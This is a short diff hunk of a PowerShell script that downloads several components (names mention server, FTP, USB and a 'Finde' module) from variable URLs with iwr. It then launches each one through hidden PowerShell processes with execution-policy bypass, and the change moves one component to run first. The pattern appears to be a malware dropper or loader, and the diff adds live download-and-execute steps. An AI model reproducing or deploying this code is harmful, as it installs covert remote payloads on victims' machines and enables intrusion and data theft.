@@ -138,14 +138,14 @@ $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
 iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
+iwr -Uri $initFinde -OutFile $initFindePath
 iwr -Uri $serverUrl -OutFile $serverPath
 iwr -Uri $ftpUrl -OutFile $ftpPath
 iwr -Uri $usbUrl -OutFile $usbPath
-iwr -Uri $initFinde -OutFile $initFindePath
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$serverPath"
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$ftpPath"
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$usbPath"
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
 
 
 
